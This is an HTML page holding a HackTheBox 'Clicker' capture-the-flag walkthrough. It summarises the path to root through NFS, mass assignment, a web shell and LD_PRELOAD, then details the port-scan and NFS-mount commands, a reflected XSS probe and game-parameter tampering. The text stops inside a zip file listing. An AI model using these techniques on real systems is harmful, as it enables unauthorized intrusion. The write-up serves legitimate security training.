@@ -1,0 +1,905 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clicker - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+    <link rel="stylesheet" href="/monokai.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/writeups.html">WriteUPs</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/medium/clicker/img/clicker.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>Clicker - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/Clicker">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Clicker</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">09</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>
+</pre></div>
+<h3><br/>About Clicker</h3><br/>
+Clicker is a medium-difficulty machine on HackTheBox. Firstly, we will exploit an NFS share to obtain the source code of a website. After reading the source code, we noticed that we could perform a mass assignment attack on the website to gain admin privileges.<br/><br/>
+<h3><br>Shell as www-data</br></h3><br>
+With admin privileges, we can extract information about the TOP players of the website. The POST request allows us to change the file extension to PHP, and by exploiting the same Mass Assignment Attack mentioned earlier, we modify our username to a PHP web shell.<br/><br/>
+<h3><br>Shell as jack</br></h3><br>
+While searching for Set-UID files on the system, we come across a Set-UID file owned by Jack. Using reverse engineering methods, we identify a file read vulnerability that allows us to obtain Jack's SSH private key.<br/><br/>
+<h3><br>Shell as root</br></h3><br>
+As Jack, we have sudo privileges that allow us to execute a bash script as root. The sudo privilege includes the SETENV attribute, enabling us to specify a malicious PRELOAD library through the LD_PRELOAD variable, thus achieving execution as root.<br/><br/>
+<h3><br>Recon</br></h3><br>
+To initiate the exploitation process, we need to identify the open ports on the target machine. Keep in mind that services are accessible through ports, making it crucial to ascertain their status. For conducting this scan, I will utilize the <code>nmap</code> tool:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">v</span> <span class="mf">10.10.11.232</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.232</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.15</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">62052</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">3474</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
+<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>
+<span class="mi">111</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">rpcbind</span>
+<span class="mi">2049</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">nfs</span>
+<span class="mi">37355</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">41471</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">45273</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">54267</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">56705</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+</pre></div>
+
+Once the scan is complete, we need to identify technologies and services running on these ports. To achieve this, I will use <code>nmap</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">2049</span><span class="p">,</span><span class="mi">37355</span><span class="p">,</span><span class="mi">41471</span><span class="p">,</span><span class="mi">45273</span><span class="p">,</span><span class="mi">54267</span><span class="p">,</span><span class="mi">56705</span> <span class="mf">10.10.11.232</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.232</span> <span class="p">(</span><span class="mf">10.10.11.232</span><span class="p">)</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.27</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+
+<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>  <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">ssh</span>      <span class="n">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="mf">.4</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mi">256</span> <span class="mi">89</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="n">a0</span><span class="p">:</span><span class="n">ea</span><span class="p">:</span><span class="n">a1</span><span class="p">:</span><span class="n">db</span><span class="p">:</span><span class="n">c1</span><span class="p">:</span><span class="mi">3</span><span class="n">d</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="n">ec</span><span class="p">:</span><span class="mi">5</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">a</span><span class="p">:</span><span class="mi">92</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">b4</span><span class="p">:</span><span class="n">da</span><span class="p">:</span><span class="mi">8</span><span class="n">d</span><span class="p">:</span><span class="n">af</span><span class="p">:</span><span class="mi">65</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">bb</span><span class="p">:</span><span class="n">f0</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="n">d5</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="n">ed</span><span class="p">:</span><span class="n">d8</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">30</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>     <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.52</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.52</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+<span class="mi">111</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">rpcbind</span>  <span class="mi">2</span><span class="o">-</span><span class="mi">4</span> <span class="p">(</span><span class="n">RPC</span> <span class="c1">#100000)</span>
+<span class="o">|</span><span class="n">_rpcinfo</span><span class="p">:</span> <span class="n">ERROR</span><span class="p">:</span> <span class="n">Script</span> <span class="n">execution</span> <span class="n">failed</span> <span class="p">(</span><span class="n">use</span> <span class="o">-</span><span class="n">d</span> <span class="n">to</span> <span class="n">debug</span><span class="p">)</span>
+<span class="mi">2049</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">nfs</span>      <span class="mi">3</span><span class="o">-</span><span class="mi">4</span> <span class="p">(</span><span class="n">RPC</span> <span class="c1">#100003)</span>
+<span class="mi">37355</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">mountd</span>   <span class="mi">1</span><span class="o">-</span><span class="mi">3</span> <span class="p">(</span><span class="n">RPC</span> <span class="c1">#100005)</span>
+<span class="mi">41471</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">nlockmgr</span> <span class="mi">1</span><span class="o">-</span><span class="mi">4</span> <span class="p">(</span><span class="n">RPC</span> <span class="c1">#100021)</span>
+<span class="mi">45273</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">status</span>   <span class="mi">1</span> <span class="p">(</span><span class="n">RPC</span> <span class="c1">#100024)</span>
+<span class="mi">54267</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">mountd</span>   <span class="mi">1</span><span class="o">-</span><span class="mi">3</span> <span class="p">(</span><span class="n">RPC</span> <span class="c1">#100005)</span>
+<span class="mi">56705</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">mountd</span>   <span class="mi">1</span><span class="o">-</span><span class="mi">3</span> <span class="p">(</span><span class="n">RPC</span> <span class="c1">#100005)</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+</pre></div>
+<h3><br>Web Application - Port 80</br></h3><br>
+As we've seen in the nmap report, the port 80 belongs to an HTTP service. Before accessing the website through my browser, I will utilize <code>whatweb</code> to obtain information about the page:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.232</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.232</span> <span class="p">[</span><span class="mi">302</span> <span class="n">Found</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.52</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.52</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.232</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="p">]</span>
+<span class="n">ERROR</span> <span class="n">Opening</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span> <span class="n">no</span> <span class="n">address</span> <span class="k">for</span> <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+
+It dropped an error. When accessing the website through the IP address, it redirects to <code>clicker.htb</code>. Since it does not know the IP address pointed to by this domain, it cannot resolve it. To deal with this problem, we have to add the domain to our <code>/etc/hosts</code> file, making it point to the IP address of the machine.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="c1"># HackTheBox</span>
+<span class="mf">10.10.11.232</span> <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+
+If we attempt to run <code>whatweb</code> again:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.232</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.232</span> <span class="p">[</span><span class="mi">302</span> <span class="n">Found</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.52</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.52</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.232</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="p">]</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.52</span><span class="p">],</span> <span class="n">Bootstrap</span><span class="p">,</span> <span class="n">Cookies</span><span class="p">[</span><span class="n">PHPSESSID</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.52</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.232</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="n">Clicker</span> <span class="o">-</span> <span class="n">The</span> <span class="n">Game</span><span class="p">]</span>
+</pre></div>
+
+It works, and the domain is resolved properly.<br/><br/>
+When accessing the website via our browser, we encounter the following content:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/1.png"/><br/><br/>
+There is an information section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/2.png"/><br/><br/>
+Here we can highlight three users: <code>ButtonLover99</code>, <code>Paol</code>, and <code>Th3Br0</code>.<br/><br/>
+There is also a login section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/3.png"/><br/><br/>
+I've tried the most common credentials, such as <code>admin:admin</code> and <code>guest:guest</code>, but they didn't work. I also attempted using the users we found as credentials, but it didn't work either.<br/><br/>
+When entering wrong credentials, this message is displayed:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/4.png"/><br/><br/>
+Looking at the URL, I realized that I can specify any message I want using the <code>?err=</code> parameter.<br/><br/>
+<div class="highlight"><pre><span></span><span class="err">http://clicker.htb/login.php?err=elswix</span>
+</pre></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/5.png"/><br/><br/>
+As any data I enter in this parameter is displayed in the response, I have tried to enter an XSS payload:<br/><br/>
+<div class="highlight"><pre><span></span><span class="err">http://clicker.htb/login.php?err=&lt;script&gt;alert(1)&lt;/script&gt;</span>
+</pre></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/6.png"/><br/><br/>
+It works, but at this point, it isn't useful.<br/><br/>
+There is also a <code>register</code> section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/7.png"/><br/><br/>
+When specifying new credentials, it displays the following message:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/8.png"/><br/><br/>
+When using these credentials in the <code>login</code> section, they work.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/9.png"/><br/><br/>
+While inspecting the requests made during the creation and login of an account, we come across new files:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/10.png"/><br/><br/>
+When creating a new account, our data is transmitted to <code>create_player.php</code>, and during the sign-in process, our data is sent to <code>authenticate.php</code>.<br/><br/>
+Once we successfully log in, we can access the <code>profile</code> section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/11.png"/><br/><br/>
+The displayed information includes my username, clicks, and level. It appears that this website functions as an online video game with points and levels.<br/><br/>
+There is also a <code>play</code> section, where we see the following content:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/12.png"/><br/><br/>
+Here is the video game, and we can play it. When clicking on <code>Save and close</code>, the following request is made:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/13.png"/><br/><br/>
+I entered the following values into the <code>clicks</code> and <code>level</code> parameters and re-sent the request.<br/><br/>
+<div class="highlight"><pre><span></span><span class="err">/save_game.php?clicks=999999&amp;level=999999</span>
+</pre></div>
+
+The following response was returned, with the message <code>Game has been saved!</code><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/14.png"/><br/><br/>
+Upon accessing the <code>profile</code> section, I noticed that the values had changed this time.<br/><br/>
+I have concluded that, by saving the game, I am interacting with and passing values to columns in a database. This process could potentially be vulnerable to a Mass Assignment attack as well.<br/><br/>
+<h3><br>NFS - Port 2049</br></h3><br>
+The port 2049 belongs to the NFS service. NFS, or Network File System, is a distributed file system protocol that allows a user on a client computer to access files over a computer network much like local storage is accessed. It enables the sharing of files and directories between systems as if they were part of the same local file system. NFS is commonly used in Unix and Linux environments for networked file sharing.<br/><br/>
+It is similar to SMB but is commonly used in Linux environments.<br/><br/>
+Various tools can be employed for enumerating this service, and <a href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting">HackTricks</a> also provides information on how to enumerate it.<br/><br/>
+To identify which resources the service is exposing, you can use <code>showmount</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">showmount</span> <span class="o">-</span><span class="n">e</span> <span class="mf">10.10.11.232</span>
+<span class="n">Export</span> <span class="nb">list</span> <span class="k">for</span> <span class="mf">10.10.11.232</span><span class="p">:</span>
+<span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">backups</span> <span class="o">*</span>
+</pre></div>
+
+It is serving the <code>/mnt/backups</code> folder of the victim file system. We can try to mount it on our machine to access its files.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">sudo</span> <span class="n">mkdir</span> <span class="o">-</span><span class="n">m</span> <span class="mi">755</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">mount</span>
+<span class="nd">elswix@kali$</span> <span class="n">sudo</span> <span class="n">mount</span> <span class="o">-</span><span class="n">t</span> <span class="n">nfs</span> <span class="mf">10.10.11.232</span><span class="p">:</span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">backups</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">mount</span>
+</pre></div>
+
+Now, we can access it:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">ls</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">mount</span>
+<span class="n">clicker</span><span class="o">.</span><span class="n">htb_backup</span><span class="o">.</span><span class="n">zip</span>
+</pre></div>
+
+There is a ZIP file named <code>clicker.htb_backup.zip</code>. I will copy it to my working directory:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">cp</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">mount</span><span class="o">/</span><span class="n">clicker</span><span class="o">.</span><span class="n">htb_backup</span><span class="o">.</span><span class="n">zip</span> <span class="o">.</span>
+</pre></div>
+
+We can inspect the ZIP content using <code>7z</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="mi">7</span><span class="n">z</span> <span class="n">l</span> <span class="n">clicker</span><span class="o">.</span><span class="n">htb_backup</span><span class="o">.</span><span class="n">zip</span>
+<span class="o">--</span>
+<span class="n">Path</span> <span class="o">=</span> <span class="n">clicker</span><span class="o">.</span><span class="n">htb_backup</span><span class="o">.</span><span class="n">zip</span>
+<span class="n">Type</span> <span class="o">=</span> <span class="nb">zip</span>
+<span class="n">Physical</span> <span class="n">Size</span> <span class="o">=</span> <span class="mi">2284115</span>
+
+   <span class="n">Date</span>      <span class="n">Time</span>    <span class="n">Attr</span>         <span class="n">Size</span>   <span class="n">Compressed</span>  <span class="n">Name</span>
+<span class="o">-------------------</span> <span class="o">-----</span> <span class="o">------------</span> <span class="o">------------</span>  <span class="o">------------------------</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">41</span> <span class="n">D</span><span class="o">....</span>            <span class="mi">0</span>            <span class="mi">0</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">55</span> <span class="o">.....</span>         <span class="mi">3341</span>         <span class="mi">1190</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">play</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">55</span> <span class="o">.....</span>         <span class="mi">3070</span>         <span class="mi">1219</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">profile</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">56</span> <span class="o">.....</span>          <span class="mi">608</span>          <span class="mi">298</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">authenticate</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">56</span> <span class="o">.....</span>          <span class="mi">541</span>          <span class="mi">276</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">create_player</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">56</span> <span class="o">.....</span>           <span class="mi">74</span>           <span class="mi">62</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">logout</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">28</span> <span class="mi">07</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">03</span> <span class="n">D</span><span class="o">....</span>            <span class="mi">0</span>            <span class="mi">0</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">28</span> <span class="mi">07</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">26</span> <span class="o">.....</span>      <span class="mi">1548311</span>      <span class="mi">1538698</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">background</span><span class="o">.</span><span class="n">png</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">23</span> <span class="mi">07</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">43</span> <span class="o">.....</span>          <span class="mi">733</span>          <span class="mi">336</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">cover</span><span class="o">.</span><span class="n">css</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">25</span> <span class="mi">08</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">21</span> <span class="o">.....</span>        <span class="mi">10912</span>         <span class="mi">7189</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">cursor</span><span class="o">.</span><span class="n">png</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="n">D</span><span class="o">....</span>            <span class="mi">0</span>            <span class="mi">0</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">js</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">250568</span>        <span class="mi">58224</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">js</span><span class="o">.</span><span class="n">map</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">311949</span>        <span class="mi">81519</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">bundle</span><span class="o">.</span><span class="n">min</span><span class="o">.</span><span class="n">js</span><span class="o">.</span><span class="n">map</span>
